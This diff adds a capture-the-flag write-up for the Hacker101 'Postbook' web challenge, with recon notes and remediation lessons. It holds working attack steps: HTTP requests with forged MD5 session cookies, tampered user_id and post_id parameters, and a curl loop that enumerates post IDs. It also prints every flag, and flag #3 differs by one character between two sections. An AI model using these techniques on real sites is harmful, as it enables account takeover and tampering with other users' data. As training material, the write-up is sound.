@@ -1,0 +1,241 @@
+================================
+LAB: Hacker101 CTF - Postbook
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: January 29, 2026
+Lab URL: https://ctf.hacker101.com/ctf
+Category: Web Application Security
+Level: Easy
+Objective: Find all 7 flags by exploiting various web vulnerabilities
+Description: Postbook is a simple social media platform where users can create public and private posts. The application contains multiple security vulnerabilities related to access control, authentication, and authorization.
+
+[RECONNAISSANCE]
+----------------
+
+Initial Analysis:
+- Web application mimicking a social media platform (Facebook-like interface)
+- Features identified:
+  * User registration and authentication (sign up/sign in)
+  * Post creation with public/private options
+  * User profiles
+  * Account settings
+  * Post editing and deletion
+
+Key Parameters Observed:
+- URL structure: index.php?page=<page_name>
+- Cookie authentication: id=<md5_hash>
+- Post operations: create.php, edit.php, delete.php, view.php
+- User-controlled parameters: user_id, post_id, message
+
+Technology Stack:
+- Server: openresty/1.27.1.2
+- Backend: PHP/5.5.9-1ubuntu4.24
+- Authentication: Cookie-based with MD5 hashes
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+
+7 distinct vulnerabilities were identified:
+
+1. IDOR (Insecure Direct Object Reference) - POST Creation
+   - Parameter: user_id in create.php form
+   - Issue: Client-side controlled user_id allows creating posts as any user
+
+2. Predictable Session Cookie
+   - Cookie format: id=md5(user_id)
+   - Issue: MD5 hash of sequential user IDs can be easily predicted and cracked
+   - Examples: md5('1') = c4ca4238a0b923820dcc509a6f75849b
+
+3. Broken Access Control - Private Posts
+   - Endpoint: view.php?id=<post_id>
+   - Issue: No owner verification allows viewing any private post
+
+4. IDOR - Cookie Enumeration
+   - Issue: Can enumerate all users by generating md5(user_id) cookies
+   - Each user's home page may contain flags
+
+5. IDOR - Post Deletion
+   - Endpoint: delete.php?id=<md5(post_id)>
+   - Issue: Can delete posts belonging to other users
+
+6. IDOR - Post Editing
+   - Endpoint: edit.php?id=<post_id>
+   - Issue: Can edit posts belonging to other users
+
+7. Hidden Post Discovery
+   - Issue: Post ID 945 exists but is not listed on any timeline
+   - Requires enumeration/fuzzing to discover
+
+[EXPLOITATION]
+--------------
+
+FLAG #1 - IDOR on user_id Parameter
+------------------------------------
+Steps:
+1. Create a user account (user_id=3)
+2. Navigate to "Write a new post"
+3. Intercept the POST request to create.php
+4. Modify parameter: user_id=3 → user_id=d (or any other value)
+5. Submit the request
+6. Flag appears on home page
+
+Payload:
+POST /index.php?page=create.php
+body=test&user_id=d&return=home
+
+Result: ^FLAG^d120f3e46aa3ff7802f1bf910a031b1c8e82a59bf63a8b660c20587414e910cc$FLAG$
+
+
+FLAG #2 - Predictable Cookie (Admin Access)
+--------------------------------------------
+Steps:
+1. Identify cookie format: id=eccbc87e4b5ce2fe28308fd9f2a7baf3 for user_id=3
+2. Crack hash: md5('3') = eccbc87e4b5ce2fe28308fd9f2a7baf3
+3. Generate admin cookie: md5('1') = c4ca4238a0b923820dcc509a6f75849b
+4. Replace cookie in browser
+5. Access home page as admin
+
+Payload:
+GET /index.php?page=home.php
+Cookie: id=c4ca4238a0b923820dcc509a6f75849b
+
+Result: ^FLAG^c64270d5c4aaa57084d62430573e08d72ce5a3577a03790f0b5c949ce9a78995$FLAG$
+
+
+FLAG #3 - Broken Access Control on Private Posts
+-------------------------------------------------
+Steps:
+1. As admin (cookie md5('1')), observe private post marked "SECRET" (ID=2)
+2. Change cookie back to your user: md5('3')
+3. Access the private post directly via URL
+
+Payload:
+GET /index.php?page=view.php&id=2
+Cookie: id=eccbc87e4b5ce2fe28308fd9f2a7baf3
+
+Result: ^FLAG^8fbb1e64b7e3348c3512a18d3d332355dd9e84740351958d03d55d0d56b596249$FLAG$
+
+
+FLAG #4 - Cookie Enumeration (user_id=2)
+-----------------------------------------
+Steps:
+1. Generate cookie for user_id=2: md5('2') = c81e728d9d4c2f636f067f89cc14862c
+2. Set cookie and access home page
+3. Flag displayed on user_id=2's home page
+
+Payload:
+GET /index.php?page=home.php
+Cookie: id=c81e728d9d4c2f636f067f89cc14862c
+
+Result: ^FLAG^4f6a7bd1be878172b036faa0e5e48850bfd5d140251972e71596b2f335450755$FLAG$
+
+
+FLAG #5 - IDOR Post Deletion
+-----------------------------
+Steps:
+1. Identify admin's post ID=1 with delete link: delete.php?id=c4ca4238a0b923820dcc509a6f75849b
+2. Recognize hash: md5('1') = post_id=1
+3. Access delete endpoint with your user cookie
+4. Flag appears after deletion
+
+Payload:
+GET /index.php?page=delete.php&id=c4ca4238a0b923820dcc509a6f75849b
+Cookie: id=eccbc87e4b5ce2fe28308fd9f2a7baf3
+
+Result: ^FLAG^2850d59dbf5c4e947b0027eb279ee16d4f496b7ccbae8939ab5e58123fa46004$FLAG$
+
+
+FLAG #6 - IDOR Post Editing
+----------------------------
+Steps:
+1. Access edit page for another user's post
+2. Submit the edit form
+3. Flag appears in URL parameter "message" after successful edit
+
+Payload:
+GET /index.php?page=edit.php&id=3
+POST /index.php?page=edit.php&id=3
+title=modified&body=modified
+
+Result: ^FLAG^042b016be1429225ecc712405161135875208104a760f60494eebf4d1e21bf55$FLAG$
+(Flag appears in redirect: view.php?success=1&id=3&message=^FLAG^...)
+
+
+FLAG #7 - Hidden Post Discovery
+--------------------------------
+Steps:
+1. Enumerate post IDs beyond visible timeline
+2. Use fuzzing/brute force on view.php parameter
+3. Post ID=945 contains the final flag
+
+Payload:
+GET /index.php?page=view.php&id=945
+Cookie: id=eccbc87e4b5ce2fe28308fd9f2a7baf3
+
+Fuzzing command:
+for i in {1..1000}; do
+  curl -s -H "Cookie: id=eccbc87e4b5ce2fe28308fd9f2a7baf3"     "https://[instance].ctf.hacker101.com/index.php?page=view.php&id=$i"     | grep -o 'FLAG[^$]*' && echo " - ID=$i"
+done
+
+Result: ^FLAG^1f08de4e80dc245915e73040fe50f19dd8b15346686c1fa34910e20368a0df32$FLAG$
+
+[EVIDENCE]
+----------
+
+All Flags Captured:
+1. d120f3e46aa3ff7802f1bf910a031b1c8e82a59bf63a8b660c20587414e910cc
+2. c64270d5c4aaa57084d62430573e08d72ce5a3577a03790f0b5c949ce9a78995
+3. 8fbb1e64b7e3348c3512a18d3d332355dd9e84740351958d03d55d0d56b59624
+4. 4f6a7bd1be878172b036faa0e5e48850bfd5d140251972e71596b2f335450755
+5. 2850d59dbf5c4e947b0027eb279ee16d4f496b7ccbae8939ab5e58123fa46004
+6. 042b016be1429225ecc712405161135875208104a760f60494eebf4d1e21bf55
+7. 1f08de4e80dc245915e73040fe50f19dd8b15346686c1fa34910e20368a0df32
+
+Vulnerability Summary:
+- 5 IDOR vulnerabilities (create, view, edit, delete, cookie enumeration)
+- 1 predictable session management (MD5 hash)
+- 1 insufficient content discovery protection (hidden post)
+
+Tools Used:
+- Burp Suite (request interception and modification)
+- Browser Developer Tools (cookie manipulation)
+- curl/bash (enumeration and fuzzing)
+- CyberChef/online MD5 tools (hash generation)
+
+[LESSONS LEARNED]
+-----------------
+
+Key Takeaways:
+
+1. Access Control Testing is Critical
+   - Always test if user A can access/modify user B's resources
+   - Check authorization on EVERY sensitive endpoint (view, edit, delete)
+   - Never trust client-side parameters (user_id, post_id)
+
+2. Session Management Best Practices
+   - Never use predictable session tokens (sequential IDs, simple hashes)
+   - Use cryptographically secure random tokens (UUID, secure random bytes)
+   - Implement proper session validation on server-side
+
+3. MD5 is NOT Secure for Authentication
+   - MD5 is cryptographically broken and fast to brute force
+   - Sequential user IDs hashed with MD5 are trivially crackable
+   - Use proper session management frameworks
+
+4. Hidden Content ≠ Secure Content
+   - Post ID 945 was "hidden" but not protected
+   - Implement proper authorization checks, not "security through obscurity"
+   - Any resource accessible via direct URL must have access controls
+
+5. Enumeration Attacks
+   - Applications must be resilient to parameter fuzzing
+   - Rate limiting and monitoring can detect enumeration attempts
+   - Proper error handling prevents information disclosure
+
+OWASP Top 10 Relevance:
+- A01:2021 – Broken Access Control (primary vulnerability class)
+- A07:2021 – Identification and Authentication Failures (predictable cookies)
+- A04:2021 – Insecure Design (client-side user_id control)
+
